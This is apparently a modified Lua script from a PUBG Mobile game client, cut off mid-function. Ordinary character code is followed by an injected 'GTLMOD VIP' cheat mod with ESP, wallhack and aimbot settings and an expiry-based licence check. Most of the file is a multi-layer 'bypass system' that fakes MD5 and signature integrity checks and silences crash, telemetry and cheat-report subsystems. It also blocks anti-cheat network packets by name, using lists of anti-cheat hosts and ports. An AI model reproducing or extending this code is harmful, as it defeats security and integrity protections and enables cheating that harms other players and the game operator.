        if Client and slua.isValid(uPlayerController) and uPlayerController.Role == ENetRole.ROLE_AutonomousProxy then
          uPlayerController:DisplayGameTipWithMsgID(47306)
        end
        return false
      end
    end
  end
  if self:HasState(EPawnState.WebSwing) and Slot ~= ESurviveWeaponPropSlot.SWPS_None and slua.isValid(self.STCharacterMovement) then
    local SpiderSwingObj = self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementType.SPECIAL_MOVE_SpiderSwing)
    if slua.isValid(SpiderSwingObj) then
      local nCurState = SpiderSwingObj:GetCurMoveState()
      if nCurState == ESpiderSwingMoveState.Launching or nCurState == ESpiderSwingMoveState.Swinging then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck blocked by SpiderSwing state: " .. tostring(nCurState))
        return false
      end
    end
  end
  return self.Super:SwitchWeaponCheck(Slot, IgnoreState)
end

local VICTORY_DANCE_FX_MAP = {
  [12219601] = 22010089
}

function ResolveEmoteResID(ItemID)
  local FxID = VICTORY_DANCE_FX_MAP[ItemID]
  if not FxID or FxID == ItemID then
    return ItemID
  end
  local model_util = require("client.common.model_util")
  local FxBPID = model_util.GetBPID(FxID)
  local ResID = ItemID
  if FxBPID and 0 < FxBPID and model_util.IsBattleItemHandleExist("Emote", FxBPID, false, false) then
    ResID = FxID
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase 11 ResolveEmoteResID ItemID:%s, FxID:%s, FxBPID:%s, ResID:%s", tostring(ItemID), tostring(FxID), tostring(FxBPID), tostring(ResID)))
  return ResID
end

function BRPlayerCharacterBase:GetEmoteHandlePath(ItemID)
  local ResID = ResolveEmoteResID(ItemID)
  if self.Super then
    return self.Super:GetEmoteHandlePath(ResID)
  end
  local model_util = require("client.common.model_util")
  local BPID = model_util.GetBPID(ResID)
  if not BPID or BPID <= 0 then
    return ""
  end
  return model_util.GetPath("Emote", BPID, false, false) or ""
end

function BRPlayerCharacterBase:GetEmoteHandle(ItemID)
  local ResID = ResolveEmoteResID(ItemID)
  if self.Super then
    return self.Super:GetEmoteHandle(ResID)
  end
  local model_util = require("client.common.model_util")
  local BPID = model_util.GetBPID(ResID)
  if not BPID or BPID <= 0 then
    return nil
  end
  local HandleClass = model_util.GetClass("Emote", BPID, false, false)
  if not HandleClass then
    return nil
  end
  local Handle = HandleClass()
  if not slua.isValid(Handle) then
    return nil
  end
  return Handle
end

-- ==============================================================================
-- ============================ START FULL LOGIC MOD ==========================
-- ==============================================================================

-- Safe call: pcall jaisa hi, lekin error ab chhupta nahi. Har naam ka PEHLA error ek baar print
-- hota hai aur _G.GTLMODErrors[name] mein save hota hai (spam nahi hota).
_G.GTLMODErrors = _G.GTLMODErrors or {}
_G.GTLSafe = function(name, fn, ...)
    local ok, err = pcall(fn, ...)
    if not ok and not _G.GTLMODErrors[name] then
        _G.GTLMODErrors[name] = tostring(err)
        pcall(print, "[GTLMOD] " .. tostring(name) .. " error: " .. tostring(err))
    end
    return ok
end

local function Notify(msg) local s = "[GTLMOD VIP New] " .. tostring(msg)
pcall(function() if _G.GTLMODNotify then _G.GTLMODNotify(s) end end)
pcall(function() local sh = import("ScriptHelperClient") if sh and
sh.AddOnScreenDebugMessage then sh.AddOnScreenDebugMessage(s, -1, 3.0, {R=1,
G=1, B=0, A=1}, {X=1.2, Y=1.2}) end end) print(s) end

local _slua = rawget(_G, "slua")

local function Valid(obj)
    if not obj then return false end
    if _slua and _slua.isValid then
        local ok, v = pcall(_slua.isValid, obj)
        if not ok or not v then return false end
    end
    return true
end

-- ==========================================
-- MODULE CACHE (avoid duplicate require calls)
-- ==========================================
local _cached_ticker = nil
local function GetTicker()
    if not _cached_ticker then
        local ok, t = pcall(require, "common.time_ticker")
        if ok and t then _cached_ticker = t end
    end
    return _cached_ticker
end

local _cached_ui_util = nil
local function GetUIUtil()
    if not _cached_ui_util then
        local ok, u = pcall(require, "client.common.ui_util")
        if ok and u then _cached_ui_util = u end
    end
    return _cached_ui_util
end

local _cached_ModuleManager = nil
local function GetModuleManager()
    if not _cached_ModuleManager then
        local ok, m = pcall(require, "client.module_framework.ModuleManager")
        if ok and m then _cached_ModuleManager = m end
    end
    return _cached_ModuleManager
end

-- Helper: check if value is a function (replaces repeated type() checks)
local function IsFunc(v) return type(v) == "function" end

-- ========================================== 
-- STATIC VARIABLES & GLOBAL CACHE OPTIMIZED (LAG-FREE)
-- ========================================== 
local C_GREEN = {R=0, G=255, B=0, A=255}
local C_RED = {R=255, G=0, B=0, A=255}
local C_CYAN = {R=0, G=255, B=255, A=255}
local C_YELLOW = {R=255, G=255, B=0, A=255}
local C_WHITE = {R=255, G=255, B=255, A=255}
local C_BLUE_TEXT = {R=0, G=200, B=255, A=255}
local SCALE_COLOR_V2 = {R=3, G=3, B=0, A=0}

local GLOBAL_BONE_LIST = {
    "head", "neck_01", "pelvis",
    "upperarm_r", "lowerarm_r", "hand_r",
    "upperarm_l", "lowerarm_l", "hand_l",
    "thigh_l", "calf_l", "foot_l",
    "thigh_r", "calf_r", "foot_r"
}

-- ========================================== 
-- GTLMOD CORE + FULL FEATURES VIP CONFIGURATION 
-- ========================================== 
_G.GTLMODConfig = _G.GTLMODConfig or { 
    EspVip = false, 
    EspRadar = false, 
    Esp5 = false, 
    Esp6 = false,
    Esp9_Count = true,
    SettingsVer = 0,
    Esp9_HP = false,
    Esp9_Line = false,
    EspWeapon = false,
    EspBomMaster = false,
    EspItemBom = false,
    EspActiveBom = false,
    EspVehicle = false,
    EspVeh_Dacia = true,
    EspVeh_UAZ = true,
    EspVeh_Buggy = true,
    EspVeh_Coupe = true,
    EspVeh_Mirado = true,
    EspVeh_Motor = true,
    EspVeh_Other = true,
    EspAntenna = false, 
    EspName = false,
    EspOutline = false, 
    OutlineThickness = 10, 
    UnlockFPS = false, 
    IpadView = false, 
    ColorBodyV2 = false,    
    HDRGlow = false,
    WallhackV2 = false,
    WallVehicle = false,
    wallhackng = false, 
    BlackSky = false,

    AimTouchEnable = false,

    AimTouchHipIgKnock  = false,
    AimTouchHipIgBot    = false,
    AimTouchHipVisCheck = false,
    AimTouchHipfire     = false,

    AimTouchSG          = false,
    AimTouchSGAutoFire  = false,
    AimTouchSGIgKnock   = false,
    AimTouchSGIgBot     = false,
    AimTouchSGVisCheck  = false,

    AimTouchScopeAll        = false,
    AimTouchScopeIgKnock    = false,
    AimTouchScopeIgBot      = false,
    AimTouchScopeVisCheck   = false,

    AimTouchScopeSniper     = false,
    AimTouchSniperIgKnock   = false,
    AimTouchSniperIgBot     = false,
    AimTouchSniperVisCheck  = false,
}

-- CONTAINS FULLY OPTIMIZED SYSTEM STATE WITH FREE RAM
_G.GTLMODState = _G.GTLMODState or { 
    LoopToken = 0, 
    AimbotLoopToken = 0,
    NativeESPReady = false,
    GraphicsUnlocked = false, 
    MenuStep = 0, 
    LastCmdTime = 0,
    TrackedMarks = {},
    EnemyMarks = {},
    LastAimbotCheckTime = 0, 
    CustomTextData = {
        OuterSpeed = 10, InnerSpeed = 10, HRecoil = 0.3, VRecoil = 0.3, IpadViewFOV = 120,
        Esp9_LineThick = 1,

        AimTouchHipPrio  = 1, AimTouchHipBone = 1, AimTouchHipCond = 1,
        AimTouchHipSpeed = 50, AimTouchHipFOV = 30, AimTouchHipDist = 250,

        AimTouchSGPrio  = 1, AimTouchSGBone = 2, AimTouchSGCond = 1,
        AimTouchSGSpeed = 80, AimTouchSGFOV = 40, AimTouchSGDist = 30,

        AimTouchScopePrio  = 1, AimTouchScopeBone = 2, AimTouchScopeCond = 1,
        AimTouchScopeSpeed = 40, AimTouchScopeFOV = 20, AimTouchScopeDist = 300,
        AimTouchScopePred  = 0, AimTouchScopeRecoil = 0,

        AimTouchSniperPrio  = 1, AimTouchSniperBone = 1, AimTouchSniperCond = 2,
        AimTouchSniperSpeed = 30, AimTouchSniperFOV = 20, AimTouchSniperDist = 400,
        AimTouchSniperPred  = 0,
    },
    LastAimbotConfigString = "",

    PrevGraphicsState = {},
}

local limitTime = os.time({ year = 2026, month = 12, day = 1, hour = 23, min = 59, sec = 0 })
local currentTime = os.time(os.date("!*t"))
-- ==========================================
-- ALL-VERSION PATH BUILDER
-- Current package ka path sabse pehle, phir baaki sab versions fallback ke taur par.
-- Isi wajah se ek hi file GL/KR/TW/VNG/BGMI sab par chalti hai.
-- ==========================================
local ALL_PKG_LIST = {
    "com.tencent.ig",
    "com.pubg.krmobile",
    "com.rekoo.pubgm",
    "com.vng.pubgmobile",
    "com.pubg.imobile",
    "com.tencent.tmgp.pubgmhd",
}

local function BuildGamePaths(subFolder, fileName)
    local paths = {}
    local base = "//storage/emulated/0/Android/data/"
    local tail = "/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/" .. subFolder .. "/" .. fileName

    -- 1) Jo version abhi chal raha hai, uska path pehle
    if _G.GTLMOD_PackageName and _G.GTLMOD_PackageName ~= "" then
        table.insert(paths, base .. _G.GTLMOD_PackageName .. tail)
    end

    -- 2) Baaki sab versions fallback
    for _, pkg in ipairs(ALL_PKG_LIST) do
        if pkg ~= _G.GTLMOD_PackageName then
            table.insert(paths, base .. pkg .. tail)
        end
    end

    -- 3) Relative fallbacks
    table.insert(paths, "ShadowTrackerExtra/Saved/" .. subFolder .. "/" .. fileName)
    table.insert(paths, "../../ShadowTrackerExtra/Saved/" .. subFolder .. "/" .. fileName)

    return paths
end

local isExpired = false

pcall(function()
    local fileName = ".sys_time_cache"
    -- HANYA path untuk Global dan Korea (Android)
    local paths = BuildGamePaths("SaveGames", fileName)
    
    local tm = package.loaded["client.logic.common.TimeManager"]
    if not tm then 
        local s, r = pcall(require, "client.logic.common.TimeManager")
        if s and r then tm = r end
    end
    if tm and type(tm.GetServerTime) == "function" then
        local serverTime = tm.GetServerTime()
        if serverTime and serverTime > 1700000000 then 
            currentTime = serverTime
        end
    end

    local lastSeenTime = 0
    for _, path in ipairs(paths) do
        local file = io.open(path, "r")
        if file then
            local data = file:read("*a")
            local savedTime = tonumber(data) or 0
            if savedTime > lastSeenTime then
                lastSeenTime = savedTime
            end
            file:close()
        end
    end

    if currentTime < lastSeenTime then
        currentTime = lastSeenTime
    else
        for _, path in ipairs(paths) do
            local file = io.open(path, "w")
            if file then
                file:write(tostring(currentTime))
                file:close()
            end
        end
    end
end)

isExpired = (currentTime > limitTime)


-- ==============================================================================
-- ================== COMPLETE COMBINED BYPASS SYSTEM v4.0 =====================
-- ==============================================================================
-- Author: @DevLet
-- Combined: Ultimate Merged Bypass v3.0 + 8-Layer Advanced Bypass
-- NO LAYER MISSED - Full Security Disablement
-- ==============================================================================

-- ==================== HELPER FUNCTIONS ====================
local function nop() return true end
local function retFalse() return false end
local function retZero() return 0 end
local function retEmpty() return {} end
local function retNil() return nil end
local function retTrue() return true end
local function retEmptyString() return "" end

local function safe_require(path)
    local ok, mod = pcall(require, path)
    return ok and mod or nil
end

-- ==================== BLACKLISTS (From First Bypass) ====================

local BLACKLIST_HOSTS = {
    "tss.tencent","syzsdk","gcloud.qq","reportlog","tdos","logupload","feedback.wh","crash2",
    "privacy.qq","privacy.tencent","oth.eve","mdt.qq","act.tencentyun","analytics","report.qq",
    "anticheatexpert","crashsight","wetest","log.tav","sngd","tracer","intlsdk","igamecj",
    "cdn.club","gpubgm","graph.facebook","calendarpushsubscription","googleads","doubleclick",
    "firebaselogging","firebaseremoteconfig","fonts.googleapis","abs.twimg","dl.listdl",
    "igame.gcloudcs","bugly","beacon","helpshift","tdm","apm","safeguard","weiyun","qzone",
    "tencent-cloud","myapp","idqqimg","gtimg","qqmail","tcdn","cloudctrl","sdkostrace",
    "103.134.189.146","mbgame","csoversea","igame","pubgmobile","down.anticheatexpert.com",
    "asia.csoversea.mbgame.anticheatexpert.com","log.tav.qq","syzsdk.qq","logiservice.qcloud",
    "opensdk.tencent","exp.helpshift","loginsdkapi.zingplay","firebase","googleapis","facebook","gvoice"
}

local BLACKLIST_PORTS = {
    "10334","11045","12221","13331","8011","8015","9001","20000","20001","20002","20003","20004",
    "20005","19700","1670","19900","14545","10213","8700","25177","10685","10336","10262","27000",
    "27040","27015","27030","10706","10095","12401","11008","10309","11075","10157","24798","10709",
    "6667","10087","31113","20371","10120","10664","13728","10769","10761","5061","5062","18081",
    "15692","9030","8080","8086","8088"
}

local FILE_KEYWORDS = {
    "tlog","crash","bugly","report","beacon","wetest","analytics","telemetry","trace","dump",
    "exception","feedback","aps_log","mtp_detect","network_loss","client_error","ue4crash","tdm","gcloud"
}

local function isBlacklisted(str)
    if type(str) ~= "string" then return false end
    local low = str:lower()
    for _, kw in ipairs(BLACKLIST_HOSTS) do
        if low:find(kw,1,true) then return true end
    end
    for _, port in ipairs(BLACKLIST_PORTS) do
        if low:find(":"..port) or low:find("/"..port) then return true end
    end
    return false
end

-- ==================== FAKE DATA (From First Bypass) ====================
local FakeData = {
    ping = function() return math.random(20, 45) end,
    deviceID = function()
        local chars = "0123456789ABCDEF"
        local id = ""
        for i = 1, 32 do
            id = id .. chars:sub(math.random(1, #chars), math.random(1, #chars))
        end
        return id
    end,
    ipAddress = function() return "192.168." .. math.random(1, 255) .. "." .. math.random(1, 255) end,
    macAddress = function()
        return string.format("%02X:%02X:%02X:%02X:%02X:%02X",
            math.random(0,255), math.random(0,255), math.random(0,255),
            math.random(0,255), math.random(0,255), math.random(0,255))
    end,
    buildFingerprint = function()
        return "qcom/msmnile/msmnile:" .. math.random(10,12) .. "/" ..
               math.random(100000,999999) .. "/user/release-keys"
    end,
    kernelVersion = function() return "4.19." .. math.random(100,200) .. "-generic" end,
    hashValue = function() return "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6" end
}

local BypassState = {
    DeadEyeDisabled = false, HawkEyeDisabled = false, VoklaiDisabled = false,
    HiggsBosonDisabled = false, HashVerifyDisabled = false, IPMappingDisabled = false,
    MemoryPatchDisabled = false, EduEyeDisabled = false, FullBypassActive = false
}

local function KillTable(tbl, keys)
    if not tbl then return end
    for _, key in ipairs(keys) do
        pcall(function()
            if type(tbl[key]) == "function" then
                tbl[key] = function() return true, {} end
            else
                tbl[key] = nil
            end
        end)
    end
end

-- ==============================================================================
-- ============== LAYER 1: SLUA BYPASS  =====================
-- ==============================================================================
local function InitializeSLUABypass()
    pcall(function()
        if slua and slua.getSignature then slua.getSignature = function() return 0xDEADBEEF end end
        local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
        if loader then
            loader.verifyBytecode = retTrue
            loader.checkIntegrity = retTrue
            if loader.disableSignatureCheck then loader.disableSignatureCheck = retTrue end
        end
        local slua_serialize = package.loaded["slua.serialize"]
        if slua_serialize then slua_serialize.check = retTrue; slua_serialize.verify = retTrue end
        if jit and jit.attach then jit.attach(function() end, "bc") end
        if _G.slua_verify then _G.slua_verify = retTrue end
        if _G.check_slua_integrity then _G.check_slua_integrity = retTrue end
    end)
end

-- ==============================================================================
-- ============== LAYER 2: MD5 BYPASS (@DevLet) ======================
-- ==============================================================================
local function InitializeMD5Bypass()
    pcall(function()
        local console = import("KismetSystemLibrary")
        if console then
            console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
            console.ExecuteConsoleCommand(nil, "pakchunk.EnableSignatureCheck 0")
            console.ExecuteConsoleCommand(nil, "s.VerifyPak 0")
            console.ExecuteConsoleCommand(nil, "sig.Check 0")
            console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
        end
        local CMode = import("CreativeModeBlueprintLibrary")
        if CMode then
            CMode.MD5HashByteArray = function() return "00000000000000000000000000000000" end
            CMode.MD5HashFile = function() return "00000000000000000000000000000000" end
            CMode.GetContentDiffData = function() return true, "BYPASSED" end
            CMode.VerifyFileIntegrity = retTrue
        end
        if _G.MD5Hash then _G.MD5Hash = function() return "00000000000000000000000000000000" end end
        if _G.CRC32 then _G.CRC32 = function() return 0 end end
        if _G.SHA1 then _G.SHA1 = function() return "BYPASS" end end
        local FileHashChecker = package.loaded["common.file_hash_checker"]
        if FileHashChecker then
            FileHashChecker.CheckFileMD5 = retTrue; FileHashChecker.VerifyAll = retTrue
            FileHashChecker.GetHash = function() return "BYPASS" end
        end
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then TssSdk.GetFileMD5 = function() return "BYPASS" end; TssSdk.VerifyFileSignature = retTrue end
        local STExtra = import("STExtraBlueprintFunctionLibrary")
        if STExtra then STExtra.CheckMD5 = retTrue; STExtra.GetMD5 = function() return "BYPASS" end; STExtra.VerifyFile = retTrue end
    end)
end

-- ==============================================================================
-- ============== LAYER 3: SKIN BYPASS (@DevLet) =====================
-- ==============================================================================
local function InitializeSkinBypass()
    pcall(function()
        local ptlog = package.loaded["client.slua.logic.download.report.puffer_tlog"]
        if ptlog then ptlog.ReportEvent = nop; ptlog.ReportDownloadResult = nop; ptlog.ReportODPTDError = nop; ptlog.ReportSkinError = nop end
        local AvatarUtils = package.loaded["AvatarUtils"]
        if AvatarUtils then AvatarUtils.CheckIsWeaponInBlackList = retFalse; AvatarUtils.IsValidAvatar = retTrue; AvatarUtils.CheckAvatarIntegrity = retTrue; AvatarUtils.ReportInvalidAvatar = nop end
        local sub = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr"):Get("FileCheckSubsystem")
        if sub then sub.StartCheck = nop; sub.ReportAbnormalFile = nop; sub.StopCheck = nop end
        local eqEx = package.loaded["client.slua.logic.report.EquipmentExceptionReport"]
        if eqEx then eqEx.Report = nop; eqEx.SendException = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 4: LOG BLOCKER (@DevLet) =====================
-- ==============================================================================
local function InitializeLogBlocker()
    pcall(function()
        local SMTD = import("ScreenshotMTDer")
        if SMTD then SMTD.MTDePicture = function() return "" end; SMTD.ReMTDePicture = function() return "" end; SMTD.HasCaptured = retTrue; SMTD.TakeScreenshot = nop end
        local TLog = package.loaded["TLog"] or _G.TLog
        if TLog then TLog.Info = nop; TLog.Warning = nop; TLog.Error = nop; TLog.Debug = nop; TLog.Report = nop; TLog.Send = nop; TLog.Flush = nop end
        local CrashSight = package.loaded["CrashSight"] or _G.CrashSight
        if CrashSight then CrashSight.ReportException = nop; CrashSight.SetCustomData = nop; CrashSight.Log = nop; CrashSight.SendCrash = nop; CrashSight.ReportUserException = nop end
        local GRUtils = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
        if GRUtils then GRUtils.BugglyPostExceptionFull = retFalse; GRUtils.CheckCanBugglyPostException = retFalse; GRUtils.ReplayReportData = nop; GRUtils.ReportGameException = nop; GRUtils.PostException = nop end
        local CTR = package.loaded["client.slua.logic.report.ClientToolsReport"]
        if CTR then CTR.SendReport = nop; CTR.SendException = nop; CTR.UploadLog = nop end
        for _, sdk in ipairs({"Firebase", "Adjust", "AppsFlyer", "FacebookAnalytics", "GameAnalytics"}) do
            local s = _G[sdk]; if s then s.logEvent = nop; s.trackEvent = nop; s.setEnabled = retFalse; s.sendEvent = nop; s.report = nop end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 5: SCANNER BLOCKER (@DevLet) =================
-- ==============================================================================
local function InitializeScannerBlocker()
    pcall(function()
        local SubMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            local subs = {"AFKReportorSubsystem", "ClientDataStatistcsSubsystem", "AvatarExceptionSubsystem", "ShootVerifySubSystemClient", "MemoryCheckSubsystem", "SpeedCheckSubsystem", "WallCheckSubsystem", "FileCheckSubsystem", "BehaviorScoreSubsystem"}
            for _, name in ipairs(subs) do
                local sub = SubMgr:Get(name)
                if sub then
                    for k, v in pairs(sub) do
                        if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Upload") or k:find("Verify") or k:find("Check") or k:find("Validate") or k:find("Scan") or k:find("Detect")) then pcall(function() sub[k] = nop end) end
                    end
                    if sub.ReportPingDelayTimer then sub:RemoveGameTimer(sub.ReportPingDelayTimer); sub.ReportPingDelayTimer = nil end; sub.DelayCount = 0
                end
            end
        end
        local AvaEx = package.loaded["GameLua.Mod.Library.GamePlay.Avatar.Exception.AvatarExceptionPlayerInst"]
        if AvaEx then AvaEx.CheckAvatarException = nop; AvaEx.CheckAvatarExceptionOnce = nop; AvaEx.ReportAvatarException = nop; AvaEx.CheckSlotMeshVisible = retFalse; AvaEx.CheckPawnVisible = retFalse; AvaEx.CheckCanBugglyPostException = retFalse end
        local TssSdk = package.loaded["TssSdk"] or _G.TssSdk
        if TssSdk then
            local origData = TssSdk.OnRecvData
            TssSdk.OnRecvData = function(data) if type(data) == "string" and (data:find("report", 1, true) or data:find("exception", 1, true) or data:find("cheat", 1, true) or data:find("violation", 1, true) or data:find("hack", 1, true) or data:find("verify", 1, true)) then return end; if origData then origData(data) end end
            TssSdk.SendReportInfo = nop; TssSdk.ScanMemory = retTrue; TssSdk.IsEmulator = retFalse; TssSdk.GetTssSdkReportInfo = retEmptyString; TssSdk.CheckEnvironment = retTrue; TssSdk.VerifyProcess = retTrue
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 6: REPLAY TELEMETRY BLOCKER (@DevLet) ========
-- ==============================================================================
local function InitializeReplayTelemetryBlocker()
    pcall(function()
        local SubMgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
        if SubMgr then
            for _, name in ipairs({"GameReportSubsystem", "ReplaySubsystem"}) do
                local sub = SubMgr:Get(name)
                if sub then for k, v in pairs(sub) do if type(v) == "function" and (k:find("Report") or k:find("Trace") or k:find("Replay") or k:find("Record") or k:find("Save")) then pcall(function() sub[k] = nop end) end end end
            end
        end
        local logRep = package.loaded["client.slua.logic.replay.logic_report_replay"]
        if logRep then logRep.ReportReplay = nop; logRep.SendReportReq = nop; logRep.UploadReplay = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 7: REPORT FLOW BLOCKER (@DevLet) =============
-- ==============================================================================
local function InitializeReportFlowBlocker()
    pcall(function()
        local flows = {"ReportAimFlow", "ReportHitFlow", "ReportAttackFlow", "ReportSecAttackFlow", "ReportFireArms", "ReportVerifyInfoFlow", "ReportMrpcsFlow", "ReportPlayerBehavior", "ReportTeammatHurt", "ReportMisKillByTeammate", "ReportForbitPick", "ReportPlayerMoveRoute", "ReportPlayerPosition", "ReportVehicleMoveFlow", "ReportSecTgameMovingFlow", "ReportParachuteData", "ReportEquipmentFlow", "ReportPlayersPing", "ReportPlayerIP", "ReportPlayerFramePingRecord", "ReportDSNetSaturation", "ReportNetContinuousSaturate", "ReportDSNetRate", "ReportCircleFlow", "ReportSecMrpcsFlow"}
        for _, f in ipairs(flows) do if _G[f] then _G[f] = nop end; if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = nop end end
        for _, f in ipairs({"CheckReportSecAttackFlowWithAttackFlow", "CheckReportSecAttackFlow"}) do if _G[f] then _G[f] = retFalse end; if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = retFalse end end
        for _, f in ipairs({"IsEnableReportMrpcsInCircleFlow", "IsEnableReportMrpcsInPartCircleFlow", "IsEnableReportMrpcsFlow", "IsEnableReportAttackFlow", "IsEnableReportHitFlow", "IsEnableReportCircleFlow"}) do if _G[f] then _G[f] = retFalse end end
    end)
end

-- ==============================================================================
-- ============== LAYER 8: PLAYER SECURITY BYPASS (@DevLet) ==========
-- ==============================================================================
local function InitializePlayerSecurityBypass()
    pcall(function()
        for _, c in ipairs({"PlayerSecurityInfoCollector", "PlayerSecurityInfo", "SecurityInfoCollector", "ClientSecurityCollector", "PlayerAntiCheatCollector"}) do
            if _G[c] then for k, v in pairs(_G[c]) do if type(v) == "function" and (k:find("Report") or k:find("Collect") or k:find("Send") or k:find("Upload") or k:find("Record")) then _G[c][k] = nop end end end
        end
        local SecSub = require("GameLua.Mod.BaseMod.Common.Security.PlayerSecurityInfoSubsystem")
        if SecSub then SecSub.ReportData = nop; SecSub.CheckCheat = retFalse; SecSub.ValidatePlayer = retTrue; SecSub.CollectData = nop; SecSub.SendToServer = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 9: CLIENT FLOW BYPASS (@DevLet) ==============
-- ==============================================================================
local function InitializeClientFlowBypass()
    pcall(function()
        for _, name in ipairs({"ClientSecMrpcsFlow", "MrpcsFlow", "MrpcsData", "ClientCircleFlowSubsystem", "ClientKillFlowSubsystem", "ClientSecPlayerKillFlow"}) do
            local sub = package.loaded[name] or _G[name]
            if sub then for k, v in pairs(sub) do if type(v) == "function" and (k:find("Report") or k:find("Send") or k:find("Flow") or k:find("Record") or k:find("Process")) then pcall(function() sub[k] = nop end) end end end
        end
    end)
end

-- ==============================================================================
-- ============== LAYER 10: SWIFT HAWK BYPASS (@DevLet) ==============
-- ==============================================================================
local function InitializeSwiftHawkBypass()
    pcall(function()
        for _, f in ipairs({"SwiftHawk", "ClientSwiftHawk", "ClientSwiftHawkWithParams", "SendSwiftHawkData"}) do if _G[f] then _G[f] = nop end; if _G.GameplayCallbacks and _G.GameplayCallbacks[f] then _G.GameplayCallbacks[f] = nop end end
        local sub = package.loaded["GameLua.Mod.BaseMod.Client.Security.SwiftHawkSubsystem"]
        if sub then sub.ReportData = nop; sub.SendReport = nop; sub.CollectTelemetry = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 11: CORONA LAB BYPASS (@DevLet) ==============
-- ==============================================================================
local function InitializeCoronaLabBypass()
    pcall(function()
        if _G.CoronaLab then _G.CoronaLab.ReportData = nop; _G.CoronaLab.SendData = nop; _G.CoronaLab.CollectData = nop; _G.CoronaLab.Telemetry = nop end
        local sub = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr"):Get("CoronaLabSubsystem")
        if sub then sub.ReportData = nop; sub.SendToServer = nop; sub.CollectTelemetry = nop; sub.StopCollection = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 12: MODIFIER EXCEPTION BYPASS (@DevLet) ======
-- ==============================================================================
local function InitializeModifierExceptionBypass()
    pcall(function()
        if _G.bReportedModifierException then _G.bReportedModifierException = false end
        local sub = require("GameLua.Mod.BaseMod.Common.Security.ModifierExceptionSubsystem")
        if sub then sub.ReportException = nop; sub.CheckModifier = retTrue; sub.ValidateModifier = retTrue; sub.ReportModifierError = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 13: SIMULATE CHARACTER LOCATION BYPASS ==================
-- ==============================================================================
local function InitializeSimulateCharacterLocationBypass()
    pcall(function()
        local sub = require("GameLua.Mod.BaseMod.Gameplay.Simulate.SimulateCharacterSubsystem")
        if sub then sub.ReportLocation = nop; sub.SendLocationData = nop; sub.VerifyLocation = retTrue end
    end)
end

-- ==============================================================================
-- ============== LAYER 14: SHOOT VERIFICATION BYPASS (@DevLet) ======
-- ==============================================================================
local function InitializeShootVerificationBypass()
    pcall(function()
        local sub = require("GameLua.Dev.Subsystem.ShootVerifySubSystemClient")
        if sub then sub.OnShootVerifyFailed = nop; sub.SendVerifyData = nop; sub.ReportBulletHit = nop; sub.UploadHitInfo = nop; sub.VerifyShot = retTrue end
        if _G.BulletHitInfoUploadData then _G.BulletHitInfoUploadData.Report = nop; _G.BulletHitInfoUploadData.Send = nop; _G.BulletHitInfoUploadData.Upload = nop end
    end)
end

-- ==============================================================================
-- ============== LAYER 15: NETWORK PACKET BLOCK (@DevLet) ===========
-- ==============================================================================
local function InitializeNetworkPacketBlock()
    pcall(function()
        if NetUtil and NetUtil.SendPacket then
            local orig = NetUtil.SendPacket
            local blocked = {
                ["ReportAttackFlow"]=1, ["ReportSecAttackFlow"]=1, ["ReportFireArms"]=1, ["ReportVerifyInfoFlow"]=1, ["ReportMrpcsFlow"]=1,
                ["ReportPlayerBehavior"]=1, ["ReportTeammatHurt"]=1, ["ReportPlayerMoveRoute"]=1, ["ReportPlayerPosition"]=1, ["ReportSecVehicleMoveFlow"]=1,
                ["report_parachute_data"]=1, ["on_tss_sdk_anti_data"]=1, ["ReportAimFlow"]=1, ["ReportHitFlow"]=1, ["ReportCircleFlow"]=1, ["report_players_ping"]=1,
                ["report_player_ip"]=1, ["report_net_saturate"]=1, ["report_speed_hack"]=1, ["report_wall_hack"]=1, ["report_aim_bot"]=1, ["report_esp_usage"]=1,
                ["report_modded_files"]=1, ["detect_cheat"]=1, ["ban_player"]=1, ["client_anti_cheat_report"]=1,
                ["ClientSecMrpcsFlow"]=1, ["MrpcsData"]=1, ["CheckReportSecAttackFlow"]=1, ["CheckReportSecAttackFlowWithAttackFlow"]=1, ["RPC_ClientCoronaLab"]=1,
                ["CoronaLabReport"]=1, ["CoronaLabData"]=1, ["PlayerSecurityInfo"]=1, ["ReportSecurityInfo"]=1, ["SendSecurityData"]=1, ["ClientCircleFlow"]=1,
                ["IsEnableReportMrpcsInCircleFlow"]=1, ["IsEnableReportMrpcsInPartCircleFlow"]=1, ["bReportedModifierException"]=1,
                ["ReportModifierException"]=1, ["RPC_Server_ReportSimulateCharacterLocation"]=1, ["ReportSimulateCharacterLocation"]=1, ["RPC_Client_ShootVertifyRes"]=1,
                ["BulletHitInfoUploadData"]=1, ["ShootVerifyFailed"]=1, ["report_unrealnet_exception"]=1, ["tss_sdk_report"]=1, ["SwiftHawk"]=1, ["ClientSwiftHawk"]=1, ["ClientSwiftHawkWithParams"]=1, ["SwiftHawkReport"]=1, ["SwiftHawkData"]=1,
                ["AntiCheatReport"]=1, ["CheatDetection"]=1, ["ViolationReport"]=1, ["SecurityViolation"]=1, ["IntegrityCheck"]=1, ["SignatureVerify"]=1
            }
            NetUtil.SendPacket = function(packetName, ...) if blocked[packetName] then return nil end; return orig(packetName, ...) end
            NetUtil.IsBypassed = true
        end
        if _G.SendRPC then
            local origRPC = _G.SendRPC
